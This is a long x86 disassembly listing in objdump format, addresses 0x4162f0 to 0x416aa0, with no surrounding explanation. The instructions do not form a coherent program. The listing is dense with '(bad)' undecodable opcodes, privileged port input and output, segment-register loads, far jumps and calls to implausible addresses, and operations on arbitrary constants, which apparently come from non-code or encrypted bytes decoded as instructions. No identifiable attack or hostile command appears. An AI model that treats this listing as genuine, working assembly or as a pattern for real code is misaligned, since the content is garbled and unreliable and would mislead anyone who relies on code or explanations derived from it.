  4162f0:	fdiv   QWORD PTR [eax+0x62]
  4162f3:	and    cl,BYTE PTR [edi]
  4162f5:	mov    ch,BYTE PTR [edi+0x6f52c809]
  4162fb:	xchg   edi,eax
  4162fc:	sbb    BYTE PTR ds:0x6e2081b4,dl
  416302:	popa   
  416303:	sbb    cl,BYTE PTR [eax]
  416305:	or     al,0x81
  416307:	aas    
  416308:	idiv   BYTE PTR [ebp-0x64]
  41630b:	loop   0x41637e
  41630d:	outs   dx,DWORD PTR ds:[esi]
  41630e:	fsubr  QWORD PTR [edi+0xe]
  416311:	jl     0x416323
  416313:	call   0x14d3f81f
  416318:	xchg   ecx,edx
  41631a:	pop    ebp
  41631b:	or     cl,BYTE PTR [ecx+0x5a]
  41631e:	push   0xffffffcf
  416320:	aaa    
  416321:	jecxz  0x41638c
  416323:	repnz test DWORD PTR [esi+0x36],edx
  416327:	jg     0x4162f4
  416329:	adc    al,0x67
  41632b:	or     BYTE PTR [ebx+0x61ec5087],0xb1
  416332:	sbb    DWORD PTR [edx-0x2496f59d],eax
  416338:	test   BYTE PTR [edi+0x30d5ec12],bl
  41633e:	mov    BYTE PTR [ecx-0x16],ch
  416341:	(bad)  [edx+eiz*2+0x25e68a67]
  416348:	test   DWORD PTR [bx+0x5d],ebx
  41634c:	leave  
  41634d:	xor    cl,bh
  41634f:	cmp    DWORD PTR [edi+0x43409d16],ecx
  416355:	mov    BYTE PTR [ecx],0x56
  416358:	push   cs
  416359:	xlat   BYTE PTR ds:[ebx]
  41635a:	int    0x26
  41635c:	jmp    0x6557:0xb8eb11ca
  416363:	pop    es
  416364:	mov    dl,0x5c
  416366:	ret    
  416367:	(bad)  
  416368:	dec    esp
  416369:	fist   WORD PTR [ebp+0x4cae0bb0]
  41636f:	add    eax,0xffffff9d
  416372:	cs mov dh,0x96
  416375:	inc    esp
  416376:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416377:	sbb    ah,al
  416379:	dec    eax
  41637a:	sbb    esi,DWORD PTR [ebp-0x79]
  41637d:	pop    ss
  41637e:	imul   esi,DWORD PTR [eax+0x7a],0xffffffd5
  416382:	xchg   DWORD PTR [ecx],esi
  416384:	cmp    dl,0x8c
  416387:	pop    eax
  416388:	dec    esi
  416389:	sub    BYTE PTR [esi],ah
  41638b:	sub    ah,BYTE PTR [ebp+edx*8+0x5c]
  41638f:	jne    0x41632a
  416391:	test   eax,0x2c0fb47
  416396:	sbb    BYTE PTR [ecx+eiz*1+0x67],0xfb
  41639b:	ficomp DWORD PTR [edi-0x3dbb69e0]
  4163a1:	jbe    0x416400
  4163a3:	adc    BYTE PTR [eax+0x47],bh
  4163a6:	outs   dx,DWORD PTR ds:[esi]
  4163a7:	ror    DWORD PTR [ebp-0x62],1
  4163aa:	xchg   ecx,eax
  4163ab:	xchg   dh,bl
  4163ad:	pop    ebp
  4163ae:	push   cs
  4163af:	mov    esi,0xc482063
  4163b4:	ins    BYTE PTR es:[edi],dx
  4163b5:	retf   
  4163b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163b7:	add    eax,0xb53fe6eb
  4163bc:	pop    ebx
  4163bd:	sub    DWORD PTR [edx+0x40],0x3b7db401
  4163c4:	(bad)  
  4163c6:	push   esi
  4163c7:	neg    esp
  4163c9:	sub    cl,BYTE PTR [edx+0x53]
  4163cc:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4163ce:	rcr    esi,cl
  4163d0:	dec    eax
  4163d1:	and    eax,0x7a0ffd60
  4163d6:	jecxz  0x416379
  4163d8:	sbb    BYTE PTR [ebx-0x7677d0be],0xe1
  4163df:	aas    
  4163e0:	in     eax,0x7d
  4163e2:	daa    
  4163e3:	outs   dx,DWORD PTR ds:[esi]
  4163e4:	lods   eax,DWORD PTR ds:[esi]
  4163e5:	mov    cs,WORD PTR [ecx-0x6ff739d3]
  4163eb:	clc    
  4163ec:	dec    esp
  4163ed:	lds    edx,FWORD PTR [edx]
  4163ef:	push   ebx
  4163f0:	xchg   ecx,eax
  4163f1:	fsub   DWORD PTR [esp+edx*4+0x50]
  4163f5:	ffree  st(3)
  4163f7:	out    dx,eax
  4163f8:	xor    edi,0x37f2b031
  4163fe:	cs mov dh,0xda
  416401:	mov    dh,0xf5
  416403:	int3   
  416404:	pop    ds
  416405:	inc    ebp
  416406:	inc    edx
  416407:	in     al,dx
  416408:	jle    0x416428
  41640a:	sti    
  41640b:	inc    esi
  41640d:	fiadd  DWORD PTR [esi+eax*4+0x7321c295]
  416414:	fnstsw WORD PTR [ebp+0x32]
  416417:	xchg   BYTE PTR [eax-0x32],dh
  41641a:	dec    esp
  41641b:	call   DWORD PTR [ecx-0x4eebd6be]
  416421:	push   ebp
  416422:	idiv   BYTE PTR ds:0x94f1e618
  416428:	sbb    DWORD PTR [edi-0x5b],esp
  41642b:	sub    edx,0x84afdcfc
  416431:	jge    0x4163e6
  416433:	dec    ebx
  416434:	jnp    0x416460
  416436:	add    BYTE PTR [edi-0x7],cl
  416439:	mov    al,ds:0x7e004976
  41643e:	cwde   
  41643f:	jno    0x4163fa
  416441:	mov    WORD PTR [edi-0x640b1cda],?
  416447:	mov    esp,0x6f0cc27f
  41644c:	and    al,0x5c
  41644e:	and    dh,cl
  416450:	jne    0x416472
  416452:	(bad)  
  416453:	out    dx,al
  416454:	retf   
  416455:	xchg   edx,eax
  416456:	mov    eax,0x4c1c4d33
  41645b:	test   DWORD PTR [edx+0x64fc4c7d],ecx
  416461:	jbe    0x41649d
  416463:	jle    0x4163f9
  416465:	clc    
  416466:	pop    ds
  416467:	dec    edx
  416468:	push   eax
  416469:	in     eax,dx
  41646a:	xchg   ebp,ebx
  41646c:	jb     0x4164db
  41646e:	repz push edi
  416470:	lods   al,BYTE PTR ds:[esi]
  416471:	dec    ebx
  416472:	push   esp
  416473:	mov    ?,WORD PTR [ecx-0x49]
  416476:	pop    eax
  416477:	xchg   ebx,eax
  416478:	call   0xf939:0x5d0d71b0
  41647f:	inc    esi
  416480:	shl    DWORD PTR [esi-0x3a],0x5
  416484:	aad    0xbe
  416486:	daa    
  416487:	push   edx
  416488:	pop    esp
  416489:	xchg   ebx,eax
  41648a:	pop    ebx
  41648b:	mov    dl,0x93
  41648d:	fucomp st(0)
  41648f:	outs   dx,BYTE PTR ds:[esi]
  416490:	leave  
  416491:	arpl   WORD PTR [ebx+edi*2-0x6b6a387a],sp
  416498:	xchg   ebp,esp
  41649a:	pop    edi
  41649b:	cld    
  41649c:	loopne 0x416506
  41649e:	out    dx,eax
  41649f:	mov    ds:0x423288a6,al
  4164a4:	into   
  4164a5:	fs xor eax,0xb445f19e
  4164ab:	jle    0x4164e1
  4164ad:	cs push edx
  4164af:	sbb    cl,dl
  4164b1:	mov    bl,0xdd
  4164b3:	or     DWORD PTR [esi+esi*1-0x7e2558ef],ecx
  4164ba:	or     eax,0xfc285f0d
  4164bf:	aas    
  4164c0:	xchg   esi,eax
  4164c1:	out    0xb8,al
  4164c3:	aam    0x16
  4164c5:	in     eax,dx
  4164c6:	hlt    
  4164c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164c8:	mov    dl,0xa0
  4164ca:	popf   
  4164cb:	and    bl,cl
  4164cd:	in     al,dx
  4164ce:	mov    dh,0x7d
  4164d0:	adc    edx,DWORD PTR [ebx-0x38]
  4164d3:	xchg   edi,eax
  4164d4:	jecxz  0x4164a3
  4164d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164d7:	nop
  4164d8:	pop    ss
  4164d9:	push   edi
  4164da:	lahf   
  4164db:	in     eax,0xa2
  4164dd:	and    eax,0xa59c688e
  4164e2:	dec    eax
  4164e3:	sub    eax,0x7e65eca5
  4164e8:	mov    bh,0xbf
  4164ea:	sbb    BYTE PTR [edi+0x54],al
  4164ed:	(bad)
  4164f0:	mov    esp,0x60eaddc8
  4164f5:	test   DWORD PTR [ebp-0x17],ebx
  4164f8:	arpl   WORD PTR [ebp+0x27],si
  4164fb:	sbb    al,0x2b
  4164fd:	imul   ebx,DWORD PTR [edi+0x73e3dbd7],0x2ff650cd
  416507:	adc    eax,0xced0ff40
  41650c:	into   
  41650d:	inc    ebx
  41650e:	pop    esi
  41650f:	xor    al,0xe0
  416511:	jg     0x416497
  416513:	mov    dl,BYTE PTR ds:[ecx-0x4f]
  416517:	or     esp,DWORD PTR [edi+ecx*8]
  41651a:	fidiv  WORD PTR [edx-0x3ce0732e]
  416520:	or     DWORD PTR [ebp-0x19088326],ebp
  416526:	adc    eax,edx
  416528:	test   ecx,edx
  41652a:	stos   DWORD PTR es:[edi],eax
  41652b:	mov    WORD PTR [esi+eax*1-0x3d4f6e70],gs
  416532:	and    bh,ah
  416534:	sahf   
  416535:	pusha  
  416536:	mov    ds:0xa8bb0601,eax
  41653b:	mov    dl,0xf4
  41653d:	push   ebp
  41653e:	push   es
  41653f:	cmp    ch,BYTE PTR [eax+0x7258a6ce]
  416545:	fdivrp st(2),st
  416547:	gs dec ebp
  416549:	into   
  41654a:	xchg   ebp,eax
  41654b:	pminub mm5,QWORD PTR [ebx+0x16ce6ac2]
  416552:	and    DWORD PTR [eax+0x3999a2b3],edi
  416558:	shr    DWORD PTR [edx+ebx*2],1
  41655b:	int    0x66
  41655d:	ret    0x0
  416560:	add    BYTE PTR [eax],al
  416562:	clc    
  416563:	pminsw mm6,QWORD PTR [edi-0x1]
  416567:	idiv   ebp
  416569:	(bad)  
  41656a:	repz push esi
  41656c:	retf   0xa6f1
  41656f:	test   eax,0xe3556e4a
  416574:	add    BYTE PTR [eax],al
  416576:	hlt    
  416577:	add    al,0x0
  416579:	add    BYTE PTR [edi-0x3eab34ba],bh
  41657f:	jmp    0x7655f8ae
  416584:	les    edi,FWORD PTR [edx-0x6e]
  416587:	mov    ecx,0x7a084246
  41658c:	cmc    
  41658d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41658e:	jnp    0x416530
  416590:	pop    esp
  416591:	xor    eax,0x5b44875
  416596:	fild   DWORD PTR [edi+0x5f]
  416599:	jle    0x416538
  41659b:	and    eax,0x857007fd
  4165a0:	ror    BYTE PTR [ebx],0xad
  4165a3:	test   al,0x31
  4165a5:	adc    al,0xe3
  4165a7:	out    0xd3,eax
  4165a9:	mov    ah,0x72
  4165ab:	sub    al,BYTE PTR [ebp-0x2fe28b03]
  4165b1:	cmc    
  4165b2:	in     al,dx
  4165b3:	jecxz  0x4165c1
  4165b5:	not    bh
  4165b7:	fucomi st,st(4)
  4165b9:	pushf  
  4165ba:	adc    al,0x5d
  4165bc:	dec    ecx
  4165bd:	and    BYTE PTR [edx-0x734c6ba4],0x72
  4165c4:	sbb    dh,BYTE PTR [ebp+0x73928177]
  4165ca:	xor    ecx,DWORD PTR [edi]
  4165cc:	jns    0x416590
  4165ce:	pusha  
  4165cf:	adc    BYTE PTR [esi],ah
  4165d1:	test   al,0x47
  4165d3:	jb     0x41659e
  4165d5:	retf   0xbb66
  4165d8:	or     BYTE PTR [ebp-0x71],0x49
  4165dc:	loopne 0x416579
  4165de:	xor    esp,DWORD PTR ds:0xa35408
  4165e4:	sbb    eax,0xcdba6dec
  4165e9:	(bad)  
  4165eb:	mov    DWORD PTR [esi+0x8],ebx
  4165ee:	pop    es
  4165ef:	stos   DWORD PTR es:[edi],eax
  4165f0:	js     0x4165cb
  4165f2:	inc    ebx
  4165f3:	jae    0x416583
  4165f5:	loop   0x4165b6
  4165f7:	(bad)  
  4165f8:	mov    ds:0x6c849fb9,eax
  4165fd:	mov    ch,0x23
  4165ff:	mov    esp,0x77f4fc0
  416604:	push   ds
  416605:	dec    esp
  416606:	hlt    
  416607:	push   eax
  416608:	fcom   QWORD PTR [ebx+0x77e8a6a5]
  41660e:	shl    dh,1
  416610:	dec    ebx
  416611:	or     BYTE PTR [ebx-0x4762a622],bh
  416617:	shr    BYTE PTR [edx+0x3c],1
  41661a:	and    esp,DWORD PTR [edx+0x23077641]
  416620:	mov    bh,0x61
  416622:	fsubr  DWORD PTR [esi+0x5f]
  416625:	pop    es
  416626:	cmp    al,bh
  416628:	or     ebx,eax
  41662a:	ss push es
  41662c:	fdivr  QWORD PTR [ebx*8+0x2b9a32f1]
  416633:	push   ebp
  416634:	adc    al,0x28
  416636:	hlt    
  416637:	pop    ds
  416638:	test   eax,0xa47f337a
  41663d:	ficomp WORD PTR [eax]
  41663f:	jb     0x4165f6
  416641:	stos   BYTE PTR es:[edi],al
  416642:	xchg   DWORD PTR [eax],ebp
  416644:	sub    al,0x15
  416646:	frstor [ebx]
  416648:	sbb    al,0x7e
  41664a:	cmp    DWORD PTR [eax+0x78],0x23
  41664e:	ins    BYTE PTR es:[edi],dx
  41664f:	jg     0x4165df
  416651:	push   ds
  416652:	jbe    0x416661
  416654:	and    al,0x37
  416656:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416657:	mov    esi,0x629d848
  41665c:	imul   ecx,DWORD PTR [ebp+0x49a449f9],0x4f3052fd
  416666:	fimul  DWORD PTR [eax]
  416668:	push   0xfc5331f1
  41666d:	dec    ebp
  41666e:	frstor [edx]
  416670:	fs push 0x93ae554e
  416676:	pop    ecx
  416677:	jl     0x416664
  416679:	dec    edx
  41667a:	mov    bl,BYTE PTR [edx-0x71]
  41667d:	xchg   esp,eax
  41667e:	xor    ah,bl
  416680:	fsub   QWORD PTR [ebx+edi*2]
  416683:	pop    eax
  416684:	test   dl,dh
  416686:	pop    edx
  416687:	jb     0x4166ef
  416689:	adc    BYTE PTR [edi],bh
  41668b:	ja     0x4166db
  41668d:	icebp  
  41668e:	fnstcw WORD PTR [ebx]
  416690:	sub    eax,0x26e7be7e
  416695:	aas    
  416696:	fdivrp st(7),st
  416698:	inc    ebx
  416699:	inc    ebp
  41669a:	sbb    al,0x69
  41669c:	or     eax,0xcb4b831f
  4166a1:	jmp    FWORD PTR [edx+0x6ed9a9f8]
  4166a7:	imul   ebp,ebx,0xffffffed
  4166aa:	push   edi
  4166ab:	hlt    
  4166ac:	and    BYTE PTR [esp+ebp*8-0x36e7a07c],al
  4166b3:	ret    0x7f44
  4166b6:	retf   
  4166b7:	(bad)  
  4166b8:	shl    DWORD PTR [eax-0x76],1
  4166bb:	or     ebp,DWORD PTR [edx+0x6c795ac8]
  4166c1:	xor    al,0x82
  4166c3:	idiv   DWORD PTR [ebp+0x5d]
  4166c6:	fisubr WORD PTR [edi+0x1c]
  4166c9:	pop    eax
  4166ca:	stc    
  4166cb:	gs (bad) 
  4166cd:	arpl   WORD PTR [eax+edi*1-0x628c7773],si
  4166d4:	pop    es
  4166d5:	and    eax,0x5d954161
  4166da:	stos   BYTE PTR es:[edi],al
  4166db:	retf   
  4166dc:	out    0xfd,eax
  4166de:	lods   eax,DWORD PTR ds:[esi]
  4166df:	pop    esp
  4166e0:	adc    al,0xf9
  4166e2:	scas   al,BYTE PTR es:[edi]
  4166e3:	xchg   ecx,eax
  4166e4:	sbb    bh,dl
  4166e6:	sub    al,0x25
  4166e8:	mov    ah,0x68
  4166ea:	rcr    BYTE PTR [eax],0xd7
  4166ed:	mov    WORD PTR [edx+0x4e],ds
  4166f0:	push   0x748749eb
  4166f5:	popf   
  4166f6:	repz mov eax,0x51cc4a7
  4166fc:	pop    ecx
  4166fd:	aas    
  4166fe:	add    ah,BYTE PTR [ebp+esi*1-0x7e709ac4]
  416705:	jnp    0x416715
  416707:	or     edi,DWORD PTR [ecx]
  416709:	mov    eax,0xc853a73a
  41670e:	inc    ebp
  41670f:	popf   
  416710:	loopne 0x416721
  416712:	lds    esp,FWORD PTR [eax]
  416714:	leave  
  416715:	sub    al,0x6e
  416717:	mov    ds,WORD PTR [ebx+ebp*2]
  41671a:	xchg   esi,eax
  41671b:	push   esi
  41671c:	into   
  41671d:	add    al,0x7f
  41671f:	fcmovb st,st(4)
  416721:	sti    
  416722:	push   ss
  416723:	inc    esi
  416724:	push   ebp
  416725:	inc    edx
  416726:	or     eax,0xad64706b
  41672b:	shl    BYTE PTR [esi+0x339762fb],1
  416731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416732:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416733:	pop    esi
  416734:	inc    ecx
  416735:	arpl   WORD PTR [ebx-0x53],si
  416738:	jbe    0x41675b
  41673a:	pop    eax
  41673b:	xor    ch,0xdc
  41673e:	fs ret 
  416740:	dec    BYTE PTR [esi-0x4b8bd1da]
  416746:	pop    ebp
  416747:	(bad)  
  416749:	jnp    0x416788
  41674b:	dec    esp
  41674c:	xor    ah,BYTE PTR [ebx+eiz*4+0x7f]
  416750:	(bad)
  416753:	cmp    edx,DWORD PTR [ebx-0x2ca00e36]
  416759:	xchg   bh,bh
  41675b:	sbb    ebx,edi
  41675d:	div    BYTE PTR [ecx-0x1d]
  416760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416761:	int3   
  416762:	lahf   
  416763:	fwait
  416764:	inc    ebx
  416765:	sbb    al,0xd8
  416767:	scas   al,BYTE PTR es:[edi]
  416768:	loope  0x4167c4
  41676a:	and    ebx,DWORD PTR [ebx]
  41676c:	mov    esp,DWORD PTR [ecx-0x7c]
  41676f:	clc    
  416770:	retf   
  416771:	(bad)  
  416772:	push   0x2c
  416774:	xchg   DWORD PTR [edi],ebp
  416776:	adc    al,0xd9
  416778:	dec    eax
  416779:	outs   dx,DWORD PTR ds:[esi]
  41677a:	lds    esp,FWORD PTR [ebx]
  41677c:	into   
  41677d:	sar    esp,0xa9
  416780:	lea    esi,[eax-0x53479a8b]
  416786:	mov    bh,0xaa
  416788:	into   
  416789:	popa   
  41678a:	(bad)  
  41678b:	sub    al,0xa4
  41678d:	retf   0x768f
  416790:	pop    esi
  416791:	mov    ecx,0x9e82318a
  416796:	in     eax,dx
  416797:	mov    ebp,0xb9fb8047
  41679c:	popa   
  41679d:	into   
  41679e:	outs   dx,BYTE PTR ds:[esi]
  41679f:	cmp    eax,0x995b0461
  4167a4:	jae    0x4167d6
  4167a6:	inc    esp
  4167a7:	in     eax,0xf0
  4167a9:	idiv   BYTE PTR [ebx-0x10]
  4167ac:	mov    cl,0x27
  4167ae:	push   ebx
  4167af:	fmulp  st(7),st
  4167b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167b2:	add    ch,bl
  4167b4:	push   edi
  4167b5:	pop    ecx
  4167b6:	inc    edi
  4167b7:	daa    
  4167b8:	(bad)  
  4167b9:	sub    DWORD PTR [ecx-0x8],esi
  4167bc:	hlt    
  4167bd:	mov    bl,0x3d
  4167bf:	mov    eax,DWORD PTR [esi]
  4167c1:	mov    dh,0xbf
  4167c3:	pusha  
  4167c4:	popf   
  4167c5:	ds inc edi
  4167c7:	fnstsw WORD PTR [esi+0x250ef4e3]
  4167cd:	inc    esp
  4167ce:	pop    ss
  4167cf:	jns    0x41676d
  4167d1:	ja     0x416753
  4167d3:	pop    esp
  4167d4:	div    BYTE PTR [esp+esi*8]
  4167d7:	outs   dx,BYTE PTR ds:[esi]
  4167d8:	sbb    al,0x5
  4167da:	(bad)  
  4167db:	xchg   edi,eax
  4167dc:	ins    BYTE PTR es:[edi],dx
  4167dd:	jnp    0x4167dc
  4167df:	pop    ebp
  4167e0:	xchg   esi,eax
  4167e1:	push   cs
  4167e2:	mov    ebx,0xf9235ba0
  4167e7:	pop    esi
  4167e8:	push   ss
  4167e9:	push   ebx
  4167ea:	addr16 test al,0x8c
  4167ed:	jo     0x4167ae
  4167ef:	repnz mov WORD PTR [edx+0x25215752],ss
  4167f6:	mov    edi,?
  4167f8:	jnp    0x416796
  4167fa:	lds    ebp,FWORD PTR [esi]
  4167fc:	shl    ebp,1
  4167fe:	cdq    
  4167ff:	xor    cl,BYTE PTR [ebp+0x2d887cc3]
  416805:	ja     0x416809
  416807:	mov    al,ds:0x5db99744
  41680c:	lds    edi,FWORD PTR [edx]
  41680e:	fisttp WORD PTR [ebx+0x67fc325b]
  416814:	loop   0x4167ee
  416816:	lea    esp,[eax-0x43]
  416819:	mov    ebx,0x97a6ae00
  41681e:	jae    0x416822
  416820:	push   ebp
  416821:	push   0x5a
  416823:	inc    DWORD PTR [esi+0x44]
  416826:	inc    ebp
  416827:	loope  0x4167d3
  416829:	imul   eax,ebp,0xe7f1db23
  41682f:	or     al,0x1e
  416831:	btc    DWORD PTR [esi+0x7c94624c],edx
  416838:	mov    cl,0xf
  41683a:	(bad)  
  41683b:	mov    cl,0x10
  41683d:	mov    bh,0xa2
  41683f:	pop    esp
  416840:	(bad)  
  416841:	inc    ebp
  416842:	sahf   
  416843:	das    
  416844:	mov    ch,0x20
  416846:	and    al,0xf6
  416848:	and    eax,0x2a7345d3
  41684d:	fisttp QWORD PTR [eax-0x5f]
  416850:	add    ebp,ebx
  416852:	ror    DWORD PTR [ecx+0x65],1
  416855:	imul   ebx,DWORD PTR [eax],0xd
  416858:	sar    bl,0x46
  41685b:	add    al,0x8d
  41685d:	out    0xc6,al
  41685f:	aaa    
  416860:	iret   
  416861:	sti    
  416862:	out    dx,al
  416863:	cmp    edx,eax
  416865:	cwde   
  416866:	push   ebx
  416867:	retf   
  416868:	loop   0x4168df
  41686a:	or     ecx,esp
  41686c:	mov    ebp,0x70d27b6f
  416871:	loope  0x41680a
  416873:	xor    BYTE PTR [edi+0x1efafded],0x64
  41687a:	sub    DWORD PTR [ecx+0x4f33f006],eax
  416880:	xchg   ebp,eax
  416881:	and    eax,0xe52b6759
  416886:	add    eax,0xf5a75d86
  41688b:	dec    esp
  41688c:	cmp    BYTE PTR ds:0x2f0c9638,ch
  416892:	(bad)  
  416894:	inc    esp
  416895:	adc    BYTE PTR [edi],ah
  416897:	imul   eax,ecx,0xffffffa9
  41689a:	adc    BYTE PTR [esi+eax*1-0x10],cl
  41689e:	push   edx
  41689f:	push   ds
  4168a0:	inc    edi
  4168a1:	das    
  4168a2:	mov    fs,WORD PTR [esi-0x28]
  4168a5:	arpl   WORD PTR [eax+0x54],bp
  4168a8:	and    DWORD PTR [esi-0x1d],esi
  4168ab:	adc    dh,BYTE PTR ds:0xb0eb3da3
  4168b1:	fisub  WORD PTR [eax+0x65]
  4168b4:	popf   
  4168b5:	push   ds
  4168b6:	nop
  4168b7:	or     BYTE PTR [edx+ebp*4+0x292fb28c],bh
  4168be:	and    al,0xd
  4168c0:	hlt    
  4168c1:	sub    bh,BYTE PTR [edx-0xc]
  4168c4:	add    bl,BYTE PTR [ecx]
  4168c6:	add    BYTE PTR [eax],ch
  4168c8:	out    dx,al
  4168c9:	loope  0x4168f8
  4168cb:	loopne 0x416900
  4168cd:	adc    eax,esp
  4168cf:	adc    bl,dh
  4168d1:	fbstp  TBYTE PTR [eax+ebx*4+0x21]
  4168d5:	pop    eax
  4168d6:	adc    eax,0x842b083d
  4168db:	ins    BYTE PTR es:[edi],dx
  4168dc:	stos   BYTE PTR es:[edi],al
  4168dd:	ss je  0x416874
  4168e0:	imul   ebp,DWORD PTR [edi+0xe],0x19538933
  4168e7:	inc    eax
  4168e8:	xchg   ebp,eax
  4168e9:	sub    cl,BYTE PTR [eax+0x66]
  4168ec:	mov    bl,0xbc
  4168ee:	hlt    
  4168ef:	in     eax,dx
  4168f0:	inc    edi
  4168f1:	(bad)  
  4168f2:	in     eax,dx
  4168f3:	out    dx,eax
  4168f4:	aad    0x3b
  4168f6:	sbb    eax,0xc7879404
  4168fb:	sbb    al,0xc0
  4168fd:	loope  0x4168e9
  4168ff:	dec    esp
  416900:	xchg   esi,eax
  416901:	and    eax,0x181ba208
  416906:	jb     0x416910
  416908:	das    
  416909:	pop    eax
  41690a:	adc    DWORD PTR [ebx],edx
  41690c:	repnz xor al,0x58
  41690f:	jg     0x416966
  416911:	pop    ds
  416912:	ds int3 
  416914:	popf   
  416915:	jae    0x41693a
  416917:	mov    cl,0xbd
  416919:	push   es
  41691a:	push   ebx
  41691b:	xor    eax,0x2c732e60
  416920:	sub    eax,0x544af56d
  416925:	cmp    ch,BYTE PTR [eax]
  416927:	mov    cl,0x51
  416929:	stos   BYTE PTR es:[edi],al
  41692a:	mov    dh,0x43
  41692c:	adc    eax,0xffffff82
  41692f:	add    ah,BYTE PTR [eax]
  416931:	pusha  
  416932:	or     al,0x91
  416934:	int    0x63
  416936:	sub    esp,DWORD PTR [ebp-0x1e]
  416939:	test   DWORD PTR [esi-0x5b5ac907],ecx
  41693f:	icebp  
  416940:	mov    ch,0x3b
  416942:	cmp    eax,0x7b001f77
  416947:	mov    dh,0x70
  416949:	sub    al,0x14
  41694b:	xchg   ecx,eax
  41694c:	push   edi
  41694d:	into   
  41694e:	xchg   DWORD PTR [edi+ecx*8-0x19603b96],edx
  416955:	and    esi,esi
  416957:	popf   
  416958:	(bad)  [ebx+0x4c]
  41695b:	mov    bh,0xba
  41695d:	inc    ecx
  41695e:	jae    0x4169bf
  416960:	fnstsw WORD PTR [eax]
  416962:	push   0xf
  416964:	xchg   esi,eax
  416965:	gs push esp
  416967:	mov    bl,0x22
  416969:	mov    eax,ds:0xeeda7a73
  41696e:	loope  0x4169eb
  416970:	mov    al,ds:0x9b343ae1
  416975:	or     BYTE PTR [edi-0x41],0xe4
  416979:	pop    ss
  41697a:	inc    eax
  41697c:	popa   
  41697d:	ds ja  0x41690d
  416980:	jp     0x416968
  416982:	pop    ss
  416983:	and    ecx,ebp
  416985:	stc    
  416986:	icebp  
  416987:	mov    ds:0x528711f7,al
  41698c:	lock arpl WORD PTR [ecx+0x18cb4943],cx
  416993:	iret   
  416994:	xchg   DWORD PTR [ebp+0x3c],esp
  416997:	xchg   BYTE PTR [edi],bh
  416999:	pop    edi
  41699a:	and    BYTE PTR [esi+0x28],ch
  41699d:	cs aaa 
  41699f:	pushf  
  4169a0:	gs (bad) 
  4169a2:	into   
  4169a3:	hlt    
  4169a4:	outs   dx,DWORD PTR ds:[esi]
  4169a5:	add    BYTE PTR [eax-0x72],bh
  4169a8:	adc    al,0xb5
  4169aa:	adc    BYTE PTR [ebx],dh
  4169ac:	mov    dh,0x10
  4169ae:	inc    esp
  4169af:	std    
  4169b0:	ret    
  4169b1:	fsubr  DWORD PTR [esi]
  4169b3:	jle    0x416a34
  4169b5:	call   0x8b48b86d
  4169ba:	out    0x16,eax
  4169bc:	jecxz  0x416960
  4169be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169bf:	neg    DWORD PTR [ebx]
  4169c1:	out    0x54,al
  4169c3:	mov    ah,0x56
  4169c5:	jg     0x416966
  4169c7:	xchg   ebp,eax
  4169c8:	fst    QWORD PTR [esi+edi*1-0x28]
  4169cc:	cmp    eax,ebp
  4169ce:	and    eax,0x7666dd78
  4169d3:	pushf  
  4169d4:	ins    BYTE PTR es:[edi],dx
  4169d5:	ror    DWORD PTR [ebp+0x66ca7da4],1
  4169db:	loop   0x41698b
  4169dd:	ins    DWORD PTR es:[edi],dx
  4169de:	mov    eax,0xd4aa979
  4169e3:	je     0x41699f
  4169e5:	mov    ebp,0x119be296
  4169ea:	mov    WORD PTR [ebx+0x79742197],gs
  4169f0:	(bad)  
  4169f1:	or     DWORD PTR [edi-0x14c5da68],ecx
  4169f7:	and    BYTE PTR [edi+0x6d],bl
  4169fa:	mov    DWORD PTR [edx+edx*8],ebx
  4169fd:	test   DWORD PTR [edx+0x40172f91],eax
  416a03:	loopne 0x416a2b
  416a05:	sub    BYTE PTR [edi+ebx*8],bl
  416a08:	aad    0xa2
  416a0a:	jecxz  0x4169c9
  416a0c:	sub    DWORD PTR [eax+0x7],0xa8be164c
  416a13:	dec    eax
  416a14:	ss daa 
  416a16:	jmp    0x416a7d
  416a18:	fwait
  416a19:	(bad)  
  416a1b:	jle    0x416a04
  416a1d:	mov    esi,0x4db06815
  416a22:	ret    0x1399
  416a25:	adc    DWORD PTR [eax-0x6e82b2eb],eax
  416a2b:	pop    ebx
  416a2c:	int3   
  416a2d:	add    esi,DWORD PTR [esi-0x41]
  416a30:	mov    ecx,0x4cd98cdd
  416a35:	mov    esp,0xa40f7cce
  416a3b:	pop    edx
  416a3c:	iret   
  416a3d:	fidivr WORD PTR [edx+0xb38a8ee]
  416a43:	xchg   edi,eax
  416a44:	inc    ebx
  416a45:	cmp    dh,al
  416a47:	repnz stos BYTE PTR es:[edi],al
  416a49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a4a:	jns    0x416a11
  416a4c:	xchg   BYTE PTR [edx+0x55],dl
  416a4f:	sbb    ch,BYTE PTR [ecx+0x16]
  416a52:	mov    ebx,0x588fcc93
  416a57:	bound  eax,QWORD PTR [edi+0x4a]
  416a5a:	loopne 0x416a97
  416a5c:	inc    eax
  416a5d:	dec    esi
  416a5e:	shr    BYTE PTR [edi+edi*1+0x7c5a7c0f],0x17
  416a66:	sub    al,0x4b
  416a68:	mov    dh,0x7e
  416a6a:	mov    dh,0xca
  416a6c:	sbb    ebx,DWORD PTR [ebp+0x0]
  416a6f:	add    BYTE PTR [eax],al
  416a71:	add    al,ch
  416a73:	xchg   ecx,eax
  416a74:	retf   0xfb3a
  416a77:	jnp    0x416a71
  416a79:	sar    DWORD PTR [edx+0x40f3b875],cl
  416a7f:	push   ss
  416a80:	int    0xba
  416a82:	dec    ecx
  416a83:	call   0x5356a88
  416a88:	add    BYTE PTR [eax],al
  416a8a:	enter  0x9a84,0x90
  416a8e:	inc    ebx
  416a8f:	pop    ds
  416a90:	(bad)  
  416a91:	mov    ecx,0xda28c59a
  416a96:	ja     0x416a33
  416a98:	jb     0x416a81
  416a9a:	es test al,0xb0
  416a9d:	lods   eax,DWORD PTR ds:[esi]
  416a9e:	(bad)  
  416a9f:	scas   eax,DWORD PTR es:[edi]
  416aa0:	jmp    0x416ad4
